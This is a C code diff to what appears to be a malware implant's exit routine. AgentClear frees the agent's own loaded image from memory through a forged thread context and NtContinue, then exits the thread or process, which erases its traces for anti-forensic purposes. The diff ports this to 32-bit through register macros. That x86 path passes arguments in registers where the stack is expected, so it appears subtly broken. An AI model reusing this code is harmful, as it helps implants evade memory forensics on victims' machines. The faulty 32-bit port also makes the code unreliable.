@@ -67,30 +67,50 @@ void AgentMain()
 	AgentClear(g_Agent->config->exit_method);
 }
 
+#if defined(_M_X64) || defined(__x86_64__)
+#define PTR_TYPE DWORD64
+#define CONTEXT_IP(ctx) (ctx).Rip
+#define CONTEXT_SP(ctx) (ctx).Rsp
+#define CONTEXT_ARG1(ctx) (ctx).Rcx
+#define CONTEXT_ARG2(ctx) (ctx).Rdx
+#define CONTEXT_ARG3(ctx) (ctx).R8
+#define CONTEXT_ARG4(ctx) (ctx).R9
+#define IMAGE_NT_HEADERS_TYPE PIMAGE_NT_HEADERS
+#else
+#define PTR_TYPE DWORD
+#define CONTEXT_IP(ctx) (ctx).Eip
+#define CONTEXT_SP(ctx) (ctx).Esp
+#define CONTEXT_ARG1(ctx) (ctx).Ecx
+#define CONTEXT_ARG2(ctx) (ctx).Edx
+#define CONTEXT_ARG3(ctx) (ctx).Ebx
+#define CONTEXT_ARG4(ctx) (ctx).Esi
+#define IMAGE_NT_HEADERS_TYPE PIMAGE_NT_HEADERS32
+#endif
+
 void AgentClear(int method)
 {
 	PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
 	PLIST_ENTRY modList = &Peb->Ldr->InLoadOrderModuleList;
 	PVOID moduleAddr = ((PLDR_DATA_TABLE_ENTRY)modList->Flink)->DllBase;
-	
-	ULONG elfanew    = ((PIMAGE_DOS_HEADER)moduleAddr)->e_lfanew;
-	DWORD moduleSize = (((PIMAGE_NT_HEADERS)((PBYTE)moduleAddr + elfanew))->OptionalHeader.SizeOfImage);
+
+	ULONG elfanew = ((PIMAGE_DOS_HEADER)moduleAddr)->e_lfanew;
+	DWORD moduleSize = (((IMAGE_NT_HEADERS_TYPE)((PBYTE)moduleAddr + elfanew))->OptionalHeader.SizeOfImage);
 
 	CONTEXT ctx = { 0 };
 	ctx.ContextFlags = CONTEXT_FULL;
 	ApiWin->RtlCaptureContext(&ctx);
 
-	ctx.Rip = (DWORD64) ApiNt->NtFreeVirtualMemory;
-	ctx.Rsp = (DWORD64) ((ctx.Rsp & ~(0x1000 - 1)) - 0x1000);
-	ctx.Rcx = (DWORD64) NtCurrentProcess();
-	ctx.Rdx = (DWORD64) (&moduleAddr);
-	ctx.R8 = (DWORD64) (&moduleSize);
-	ctx.R9 = (DWORD64) MEM_RELEASE;
+	CONTEXT_IP(ctx) = (PTR_TYPE)ApiNt->NtFreeVirtualMemory;
+	CONTEXT_SP(ctx) = (PTR_TYPE)((CONTEXT_SP(ctx) & ~(0x1000 - 1)) - 0x1000);
+	CONTEXT_ARG1(ctx) = (PTR_TYPE)NtCurrentProcess();
+	CONTEXT_ARG2(ctx) = (PTR_TYPE)(&moduleAddr);
+	CONTEXT_ARG3(ctx) = (PTR_TYPE)(&moduleSize);
+	CONTEXT_ARG4(ctx) = (PTR_TYPE)MEM_RELEASE;
 
 	if (method == 1)
-		*(ULONG_PTR volatile*)(ctx.Rsp + (sizeof(ULONG_PTR) * 0x0)) = (UINT_PTR) ApiNt->RtlExitUserThread;
+		*(PTR_TYPE volatile*)(CONTEXT_SP(ctx)) = (PTR_TYPE)ApiNt->RtlExitUserThread;
 	else if (method == 2)
-		*(ULONG_PTR volatile*)(ctx.Rsp + (sizeof(ULONG_PTR) * 0x0)) = (UINT_PTR) ApiNt->RtlExitUserProcess;
+		*(PTR_TYPE volatile*)(CONTEXT_SP(ctx)) = (PTR_TYPE)ApiNt->RtlExitUserProcess;
 
 	ctx.ContextFlags = CONTEXT_FULL;
 	ApiNt->NtContinue(&ctx, FALSE);
